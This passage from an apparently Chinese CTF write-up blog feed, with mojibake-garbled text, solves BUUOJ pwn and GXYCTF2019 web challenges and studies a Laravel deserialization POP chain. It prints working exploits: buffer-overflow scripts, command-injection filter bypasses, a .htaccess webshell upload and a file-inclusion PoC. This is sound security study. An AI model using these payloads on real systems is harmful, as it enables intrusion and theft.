id="0x-02-warmup-csaw-2016"><a href="#0x-02-warmup-csaw-2016" class="headerlink" title="0x 02 warmup_csaw_2016"></a>0x 02 warmup_csaw_2016</h3><p>å­˜åœ¨åé—¨å‡½æ•°</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122111550543.png" alt></p><p>é¦–å…ˆæˆ‘ä»¬ç”¨cyclicåˆ›å»ºä¸€ä¸ª200å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨å®ƒæ¥åˆ¤æ–­æº¢å‡ºç‚¹åˆ°è¿”å›åœ°å€çš„åç§»</p><p>å¯åŠ¨dbgè¿›è¡Œè°ƒè¯•</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122112113113.png" alt></p><p>ç”±å›¾å¯å¾—ï¼Œæ ¹æ®å°ç«¯åºï¼Œâ€˜saaaâ€˜ä¹‹å‰æœ‰å¤šå°‘ä¸ªå­—ç¬¦ï¼Œå°±æ˜¯åç§»é‡</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122112201127.png" alt></p><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p&#x3D;remote(&#39;node3.buuoj.cn&#39;,25478)</span><br><span class="line">addr&#x3D;0x40060d</span><br><span class="line">payload&#x3D;&#39;a&#39;*72+p64(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x-03-pwn1-sctf-2016"><a href="#0x-03-pwn1-sctf-2016" class="headerlink" title="0x 03 pwn1_sctf_2016"></a>0x 03 pwn1_sctf_2016</h3><p>åœ¨è¾“å…¥ç‚¹ä¸­å¯ä»¥è¾“å…¥32ä¸ªå­—èŠ‚çš„æ•°æ®åˆ°0x3cç©ºé—´ï¼Œä¸å­˜åœ¨æº¢å‡ºé—®é¢˜ã€‚</p><p>æ¥ç€å‡ºç°äº†å­—ç¬¦ä¸²youã€å­—ç¬¦ä¸²Iå’Œreplaceå‡½æ•°ï¼Œåˆæ­¥çŒœæµ‹æ˜¯å‘ç”Ÿäº†æ›¿æ¢æ“ä½œï¼Œæ‰§è¡ŒéªŒè¯</p><p>æ›¿æ¢è¿‡ç¨‹ä¸ºI=you,ä¸€ä¸ªå­—èŠ‚äº§ç”Ÿä¸‰ä¸ªå­—èŠ‚ã€‚</p><p>åœ¨æ›¿æ¢å®Œæˆåï¼Œä½¿ç”¨äº†strcpyå‡½æ•°å°†æ›¿æ¢åçš„æ•°æ®æ‹·è´åˆ°sä¸­ã€‚è¿™é‡Œå¯ä»¥æ„é€ æº¢å‡ºç‚¹ã€‚</p><p>é€šè¿‡è¾“å…¥21ä¸ªIï¼Œç„¶åæ›¿æ¢æˆ21ä¸ªyouï¼Œä¸€å…±63ä¸ªå­—èŠ‚æ•°æ®ï¼Œç„¶åä»»æ„å¡«å…¥ä¸€ä¸ªå­—èŠ‚æ•°æ®ï¼Œæ¥ç€å°±å¡«å……æ»¡æº¢å‡ºç©ºé—´ï¼Œç„¶åå†åŠ«æŒæ§åˆ¶æµEIPåˆ°åˆ©ç”¨ç‚¹å‡½æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28850)</span><br><span class="line">flag_addr &#x3D; 0x08048f0d</span><br><span class="line">payload &#x3D; &#39;I&#39;*((0x3c+4-1)&#x2F;3)+&#39;R&#39;+p32(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h3 id="0x-04-ciscn-2019-n-1"><a href="#0x-04-ciscn-2019-n-1" class="headerlink" title="0x 04 ciscn_2019_n_1"></a>0x 04 ciscn_2019_n_1</h3><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122145436538.png" alt></p><p>å°±æ˜¯ä¸€ä¸ªç®€å•çš„æº¢å‡ºè®©v2å˜æˆ11.28125ã€‚v1æ˜¯var_30ï¼Œv2æ˜¯var_4ï¼š</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122145537195.png" alt></p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122145607698.png" alt></p><p>å†çœ‹ä¸€ä¸‹11.28125åœ¨ç¨‹åºä¸­çš„è¡¨ç¤ºï¼š</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122145944155.png" alt></p><p>ä¹Ÿå°±æ˜¯è®©v2å˜æˆ41348000hï¼Œæ‰€ä»¥expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">29263</span>)</span><br><span class="line">payload = <span class="string">'1'</span> * <span class="number">0x2c</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x-05"><a href="#0x-05" class="headerlink" title="0x 05"></a>0x 05</h3>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019å¤ç›˜</title>
      <link href="/2020/03/20/GXYCTF2019%E5%A4%8D%E7%9B%98/"/>
      <url>/2020/03/20/GXYCTF2019%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x-01-Ping-Ping-Ping"><a href="#0x-01-Ping-Ping-Ping" class="headerlink" title="0x 01 Ping Ping Ping"></a>0x 01 Ping Ping Ping</h3><ul><li>è§£é¢˜æ€è·¯</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;ip&#39;]))&#123;</span><br><span class="line">  $ip &#x3D; $_GET[&#39;ip&#39;];</span><br><span class="line">  if(preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜ç›®é¦–å…ˆè¿‡æ»¤äº†ç¬¦å·ï¼Œä½†æ˜¯è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œå¯ä»¥ä½¿ç”¨ç®¡é“ç¬¦å’Œ;ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨è¿™ä¸¤ä¸ªç¬¦å·æ¥æ‹¼</p><p>æ¥å‘½ä»¤ï¼›å…¶æ¬¡è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨$IFS$9æ¥æ›¿ä»£ç©ºæ ¼ï¼›æœ€åè¿‡æ»¤äº†flflagï¼Œè¿™ä¸ªè¿‡æ»¤æ¯”è¾ƒä¸¥æ ¼ï¼Œå…·</p><p>ä½“çš„æ­£åˆ™æ˜¯ .<em>f.<em>l.</em>a.*g.</em> ï¼Œå¯ä»¥é€šè¿‡ base64 æ¥ç»•è¿‡ï¼Œæˆ–è€…ç”¨å˜é‡åæ‹¼æ¥ç»•è¿‡ã€‚</p><p>è§£æ³•ä¸€ï¼šåˆ©ç”¨åå¼•å·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>è§£æ³•äºŒï¼šåˆ©ç”¨base64ç»•è¿‡ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</span><br><span class="line">## ç®¡é“ç¬¦çš„ä½œç”¨æ˜¯å°†ä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤å‚æ•°</span><br></pre></td></tr></table></figure><p>è§£æ³•ä¸‰ï¼šåˆ©ç”¨å˜é‡æ‹¼æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;ag;b&#x3D;fl;cat$IFS$9$b$a.php</span><br></pre></td></tr></table></figure><h3 id="0x-02-ç¦æ­¢å¥—å¨ƒ"><a href="#0x-02-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="0x 02 ç¦æ­¢å¥—å¨ƒ"></a>0x 02 ç¦æ­¢å¥—å¨ƒ</h3><ul><li><p>è§£é¢˜æ€è·¯</p><p>æ‰«æç›®å½•ï¼Œå‘ç°.git/æ–‡ä»¶å¤¹ï¼Œä½¿ç”¨ githack å¾—åˆ°æºä»£ç </p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#39;exp&#39;]))&#123;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">        if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">            if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">                &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];</span><br><span class="line">                @eval($_GET[&#39;exp&#39;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è€ƒçš„æ˜¯æ— å‚æ•°rce</p><p>è§£æ³•ä¸€ï¼š</p><p>ä½¿ç”¨ scandir()æŸ¥çœ‹å½“å‰ç›®å½•æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨ pos(localeconv()); æ„é€ ä¸€ä¸ª . å‡ºæ¥ï¼Œç”¨ print_r() è¾“å‡ºï¼Œå³å¯å¾—åˆ°å½“å‰çš„ç›®å½•æ–‡ä»¶æƒ…å†µã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨flag.phpä½äºå€’æ•°ç¬¬äºŒä¸ªï¼Œç”¨ä¸€ä¸ªarray_reverse() å‡½æ•°å°†æ•°ç»„ç¿»è½¬ï¼Œå†è¯»å–nextå³å¯è¯»å–åˆ°flagæ–‡ä»¶ï¼Œæœ€åä½¿ç”¨ show_source()å¯ä»¥æ˜¾ç¤º php ä»£ç ï¼Œå³å¯æ‹¿åˆ°flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>è§£æ³•äºŒ</p><p><img src="https://uploader.shimo.im/f/7RcZuASL4Ak4qgYh.png!original" alt="img"></p><h3 id="0x-03-BabyUpload"><a href="#0x-03-BabyUpload" class="headerlink" title="0x 03 BabyUpload"></a>0x 03 BabyUpload</h3><ul><li><p>è§£é¢˜æ€è·¯</p><p>éšä¾¿ä¸Šä¼ å‘ç°æ–‡ä»¶åç¼€phè¢«æ‹¦æˆªï¼Œ php3ã€phtml éƒ½ä¸èƒ½ä½¿ï¼Œéšä¾¿æå‡ºæ¥ä¸€ä¸ª404å¾—çŸ¥æ˜¯ apache æœåŠ¡å™¨ï¼Œå¯ä»¥ä½¿ç”¨ .htaccess æ–‡ä»¶æ”¹å˜æ–‡ä»¶è§£æé…ç½®ï¼Œä½¿å¾—æœåŠ¡å™¨å¯ä»¥æŠŠjpgå½“åšphpè§£æï¼Œä»è€Œå‘½ä»¤æ‰§è¡Œï¼›æ­¤å¤–ï¼ŒæœåŠ¡å™¨ä¼š<strong>æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦åŒ…å«</strong> ï¼ˆå¯ä»¥fuzzå‡ºæ¥ï¼‰ï¼Œè¦ä½¿ç”¨æ ¼å¼ç¼–å†™phpä»£ç ã€‚å› æ­¤ï¼Œæœ¬é¢˜ä¸Šä¼  .htaccess æ–‡ä»¶ä¿®æ”¹apacheçš„è§£æï¼Œå†æŠŠä¸€å¥è¯æœ¨é©¬åç¼€æ”¹ä¸ºjpgå³å¯</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;408150eb-1fa1-4377-94e9-63e769e1c586.node3.buuoj.cn&#x2F;&quot;</span><br><span class="line">session &#x3D; requests.session()</span><br><span class="line">htaccess &#x3D; &#123;&#39;uploaded&#39;: (&#39;.htaccess&#39;, &quot;SetHandler application&#x2F;x-httpd-php&quot;, &#39;image&#x2F;jpeg&#39;)&#125;</span><br><span class="line">res_hta &#x3D; session.post(url, files&#x3D;htaccess)</span><br><span class="line">files &#x3D; &#123;&#39;uploaded&#39;: (&#39;123.jpg&#39;, &quot;&lt;script language&#x3D;\&quot;php\&quot;&gt;echo file_get_contents(\&quot;&#x2F;flag\&quot;);&lt;&#x2F;script&gt;&quot;, &#39;image&#x2F;jpeg&#39;)&#125;</span><br><span class="line">res_jpg &#x3D; session.post(url, files&#x3D;files)</span><br><span class="line">res_shell &#x3D; session.post(url + res_jpg.text[-69:-22], data &#x3D; &#123;&#39;a&#39;:&#39;echo file_get_contents(\&#39;&#x2F;flag\&#39;);&#39;&#125;)</span><br><span class="line">print(res_shell.text)</span><br></pre></td></tr></table></figure><p>å…¶ä»–é¢˜ç›®å‚è€ƒ<a href="https://hwlanxiaojun.github.io/2020/03/20/å®‰æ’æ¯ä¸¨æ–°æ˜¥ç¥ˆç¦èµ›/" target="_blank" rel="noopener">https://hwlanxiaojun.github.io/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/</a></p>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> GXYCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravelååºåˆ—åŒ–å­¦ä¹ </title>
      <link href="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>â€‹    æœ€è¿‘åœ¨åˆ·buuojå‘ç°äº†Laravelæ¡†æ¶çš„é¢˜ç›®ï¼Œwebèœé¸¡å¼€å§‹æŒ‰ç…§ç½‘ä¸Šçš„æ–¹æ³•å¼€å§‹å­¦ä¹ æŒ–æ˜popé“¾</p><h3 id="0x-01-CISCN2019-æ€»å†³èµ›-Day1-Web4-Laravel1"><a href="#0x-01-CISCN2019-æ€»å†³èµ›-Day1-Web4-Laravel1" class="headerlink" title="0x 01 [CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1"></a>0x 01 [CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1</h3><ul><li>ç¬¬ä¸€ç§popé“¾</li></ul><ol><li>é¢˜ç›®æ‰“å¼€ç»™äº†æç¤ºï¼Œéœ€è¦å®¡è®¡Laravelæºç ï¼Œæ‰¾ååºåˆ—åŒ–é“¾</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319141527181.png" alt></p><ol start="2"><li>æºä»£ç æ‹–å…¥phpstrom,å…ˆå…¨å±€æœç´¢__destructå‡½æ•°ï¼Œæ‰¾åˆ°è¿™ä¸ªç±»</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319141755822.png" alt></p><p>è¿›å…¥<code>TagAwareAdapter.php</code>è·Ÿè¿›é­”æœ¯æ–¹æ³•</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319141847277.png" alt></p><p>è·Ÿè¿›commit-&gt;è·Ÿè¿›invalidateTags</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142134849.png" alt></p><p>åœ¨è¯¥ç±»ä¸‹ctrl+fæœä¸€ä¸‹$this-&gt;poolè¿›è¡ŒæŸ¥çœ‹</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142244132.png" alt></p><p>å¯ä»¥çœ‹åˆ°$this-&gt;poolæ˜¯å¯æ§çš„ï¼Œä½†æ˜¯éœ€è¦å®ç°AdapterInterfaceæ¥å£ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ‰¾åˆ°æŸä¸ªç±»ï¼Œå®ƒæ—¢å®ç°äº†AdapterInterfaceè¿™ä¸ªæ¥å£ï¼ŒåŒæ—¶åˆæœ‰saveDeferredæ–¹æ³•(æˆ–è€…æ²¡æœ‰è€Œæœ‰__callæ–¹æ³•)ï¼Œè€Œä¸”æ»¡è¶³ä¸€å®šæ¡ä»¶èƒ½æ–‡ä»¶è¯»å–æˆ–å‘½ä»¤æ‰§è¡Œå³å¯ã€‚</p><p>å…¨å±€æœç´¢saveDeferredæ–¹æ³•ï¼Œç„¶åé¦–å…ˆè·Ÿæ®æœ‰æ— AdapterInterfaceæ¥å£è¿›è¡Œæ’é™¤</p><p>å‘ç°åœ¨PhpArrayAdapter.php</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142626551.png" alt></p><p>è·Ÿè¿›initializeæ–¹æ³•ï¼Œæ¥åˆ°PhpArrayTraitç±»ä¸‹</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142804748.png" alt></p><p>å­˜åœ¨æ–‡ä»¶åŒ…å«ç‚¹ï¼Œè‡³æ­¤åˆ†æç»“æŸ</p><ol start="3"><li>æ„é€ pocï¼Œé¦–å…ˆåœ¨PhpArrayAdapterç±»ä¸‹çš„saveDeferredæ–¹æ³•çš„å…¥å£å‚æ•°itemæ˜¯å®ç°äº†CacheItemInterfaceçš„ï¼Œä¹Ÿå°±æ˜¯itemåº”è¯¥ä¸ºå®ç°äº†è¯¥æ¥å£çš„ç±»çš„å®ä¾‹</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142932210.png" alt></p><p>åœ¨å¤´æ–‡ä»¶çš„å®šä¹‰å‡ºå‘ç°ä½¿ç”¨<code>use Symfony\Component\Cache\CacheItem;</code></p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319143030711.png" alt></p><p>æ„é€ å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¤includeä¸‹çš„æ–‡ä»¶ä¸º/flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'/flag'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å›åˆ°è§¦å‘ç‚¹,å…¶ä¸­itemä¸ºdeferredè¿™ä¸ªæ•°ç»„çš„å€¼ï¼Œå¹¶ä¸”è¿™é‡Œçš„iteméœ€è¦å®ç°CacheItemInterfaceæ¥å£ï¼Œä¹Ÿå°±æ˜¯itemä¸ºCacheItemç±»çš„å®ä¾‹ï¼Œè€Œpoolå°±æ˜¯phparrayadapterçš„å®ä¾‹</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319143322334.png" alt></p><p>å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class TagAwareAdapter&#123;</span><br><span class="line">    private $deferred &#x3D; [];</span><br><span class="line">    private $pool;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;deferred &#x3D; array(&#39;xxx&#39; &#x3D;&gt; new CacheItem());</span><br><span class="line">        $this-&gt;pool &#x3D; new PhpArrayAdapter();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»„åˆåœ¨ä¸€èµ·å¾—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'/flag'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $deferred = [];</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span 